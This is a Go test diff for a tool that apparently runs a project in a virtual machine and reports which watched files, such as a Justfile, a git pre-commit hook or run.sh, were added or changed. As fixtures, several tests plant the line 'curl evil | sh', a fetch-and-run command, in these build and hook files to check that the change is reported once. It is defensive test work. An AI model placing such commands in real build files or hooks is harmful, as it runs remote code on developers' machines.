@@ -5,6 +5,7 @@ import (
 	"context"
 	"os"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -155,4 +156,67 @@ func TestReportChangesQuotesANameThatIsNoUTF8(t *testing.T) {
 
 	// assert
 	assert.Contains(t, out.String(), `  added      ".vscode/\x9b2J"`+"\n")
+}
+
+func TestRunTellsOfAChangedJustfileOnceWhateverItsCase(t *testing.T) {
+	// arrange
+	f := newFixture(t)
+	image := writeImage(t, t.TempDir(), "vmlinuz", "os.ext4")
+	writeFile(t, filepath.Join(f.cwd, "Justfile"), "test:\n")
+	f.launch.vm = func(_ context.Context, spec backend.Spec) error {
+		writeFile(t, filepath.Join(spec.Project, "Justfile"), "test:\n\tcurl evil | sh\n")
+		writeFile(t, filepath.Join(spec.Project, ".husky", "pre-commit"), "curl evil | sh\n")
+
+		return nil
+	}
+
+	// act
+	err := f.run("--image", image)
+
+	// assert
+	require.NoError(t, err)
+	assert.Contains(t, f.stderr.String(), "  added      .husky/pre-commit\n")
+	assert.Equal(t, 1, strings.Count(strings.ToLower(f.stderr.String()), "  changed    justfile\n"))
+}
+
+func TestRunTellsOfAFileOnceWhenTwoWatchedNamesLeadToIt(t *testing.T) {
+	// arrange
+	f := newFixture(t)
+	image := writeImage(t, t.TempDir(), "vmlinuz", "os.ext4")
+	f.writeConfig(t, "allow: []\nwatch:\n  - run.sh\n")
+	writeFile(t, filepath.Join(f.cwd, "run.sh"), "make\n")
+	require.NoError(t, os.Link(filepath.Join(f.cwd, "run.sh"), filepath.Join(f.cwd, "justfile")))
+	f.launch.vm = func(_ context.Context, spec backend.Spec) error {
+		writeFile(t, filepath.Join(spec.Project, "run.sh"), "curl evil | sh\n")
+
+		return nil
+	}
+
+	// act
+	err := f.run("--image", image)
+
+	// assert
+	require.NoError(t, err)
+	assert.Contains(t, f.stderr.String(), "  changed    justfile\n")
+	assert.NotContains(t, f.stderr.String(), "run.sh")
+}
+
+func TestRunWatchesAFileWrittenInAnotherCase(t *testing.T) {
+	// arrange
+	f := newFixture(t)
+	image := writeImage(t, t.TempDir(), "vmlinuz", "os.ext4")
+	writeFile(t, filepath.Join(f.cwd, "JUSTFILE"), "test:\n")
+	f.writeConfig(t, "allow: []\nwatch:\n  - JUSTFILE\n")
+	f.launch.vm = func(_ context.Context, spec backend.Spec) error {
+		writeFile(t, filepath.Join(spec.Project, "JUSTFILE"), "test:\n\tcurl evil | sh\n")
+
+		return nil
+	}
+
+	// act
+	err := f.run("--image", image)
+
+	// assert
+	require.NoError(t, err)
+	assert.Equal(t, 1, strings.Count(strings.ToLower(f.stderr.String()), "  changed    justfile\n"))
 }
